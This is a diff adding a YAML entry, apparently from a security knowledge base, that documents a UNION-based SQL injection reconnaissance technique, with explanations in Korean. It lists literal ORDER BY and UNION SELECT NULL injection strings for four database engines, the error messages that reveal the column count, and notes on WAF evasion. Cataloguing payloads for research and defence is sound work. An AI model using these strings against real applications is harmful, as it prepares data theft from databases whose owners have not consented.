@@ -1,0 +1,152 @@
+# GR-SEC-INS-P0004: UNION Column Count Detection Payload
+
+identity:
+  id: GR-SEC-INS-P0004
+  name: "UNION Column Count Detection Payload"
+  normalization:
+    normalized_name: "union column count detection payload"
+    normalization_version: "1.0"
+  aliases:
+    - "ORDER BY Column Finder"
+    - "NULL Column Test"
+    - "컬럼 수 탐지"
+
+classification:
+  domain: security
+  type: payload
+  abstraction_level: 1
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-EXPLOIT"
+
+definition:
+  what: |
+    UNION SQLi 실행 전 원래 쿼리의 컬럼 수를 파악하기
+    위한 페이로드이다. ORDER BY 이진 탐색 또는
+    UNION SELECT NULL 증가 방식을 사용한다.
+  why: |
+    UNION SELECT는 원래 쿼리와 컬럼 수가 일치해야 한다.
+    컬럼 수 불일치는 에러를 발생시키므로, 이를 이용해
+    정확한 컬럼 수를 파악할 수 있다.
+
+payload:
+  order_by_method:
+    description: "ORDER BY N에서 N을 증가시켜 에러 발생 지점 탐색"
+    sequence:
+      - "' ORDER BY 1--"
+      - "' ORDER BY 2--"
+      - "' ORDER BY 5--"
+      - "' ORDER BY 10--"
+      - "' ORDER BY 20--"
+    binary_search:
+      - step: "에러 없음 → N 증가"
+      - step: "에러 발생 → N-1이 컬럼 수"
+  null_method:
+    description: "UNION SELECT NULL 개수를 증가시켜 성공 지점 탐색"
+    sequence:
+      - "' UNION SELECT NULL--"
+      - "' UNION SELECT NULL,NULL--"
+      - "' UNION SELECT NULL,NULL,NULL--"
+      - "' UNION SELECT NULL,NULL,NULL,NULL--"
+      - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+    confirmation:
+      - step: "에러 발생 → NULL 추가"
+      - step: "에러 없음 → 현재 NULL 개수가 컬럼 수"
+  dbms_variations:
+    mysql:
+      order_by: "' ORDER BY {n}--"
+      null_union: "' UNION SELECT {nulls}--"
+    mssql:
+      order_by: "' ORDER BY {n}--"
+      null_union: "' UNION SELECT {nulls}--"
+    oracle:
+      order_by: "' ORDER BY {n}--"
+      null_union: "' UNION SELECT {nulls} FROM dual--"
+    postgresql:
+      order_by: "' ORDER BY {n}--"
+      null_union: "' UNION SELECT {nulls}--"
+
+detection:
+  method: error_boundary
+  indicators:
+    order_by_error:
+      - "Unknown column"
+      - "ORDER BY position"
+      - "out of range"
+    union_error:
+      - "different number of columns"
+      - "column count"
+      - "SELECTs have different"
+
+relations:
+  structural:
+    instance_of:
+      - GR-SEC-TEC-00001  # UNION-based SQLi
+  conditional:
+    prerequisite_for:
+      - GR-SEC-INS-P0005  # UNION data extraction
+
+constraints:
+  - property: effectiveness
+    base_value: 0.85
+    conditions:
+      - when:
+          context_type: security
+          condition: "waf_blocks_order_by == true"
+        then:
+          value: 0.4
+          reason: "ORDER BY 차단 시 NULL 방식 사용"
+      - when:
+          context_type: security
+          condition: "waf_blocks_union == true"
+        then:
+          value: 0.0
+          reason: "UNION 차단 시 사용 불가"
+
+properties:
+  security:
+    severity: info
+    purpose: reconnaissance
+    step_in_chain: 1
+    max_columns_tested: 50
+    dbms_universal: true
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: manual
+      source_uri: "internal://gr-sqli-payloads"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_authoring"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: low
+  ai:
+    embedding_text: |
+      UNION Column Count Detection은 UNION SQLi 전에 원래
+      쿼리의 컬럼 수를 파악하는 페이로드이다. ORDER BY N
+      이진 탐색 또는 UNION SELECT NULL 증가 방식을 사용한다.
+      UNION은 컬럼 수 일치가 필수이므로 이 단계가 선행되어야
+      한다. Oracle은 FROM dual이 필요하다.
+    search_keywords:
+      - "ORDER BY"
+      - "column count"
+      - "NULL"
+      - "컬럼 수"
+      - "UNION preparation"
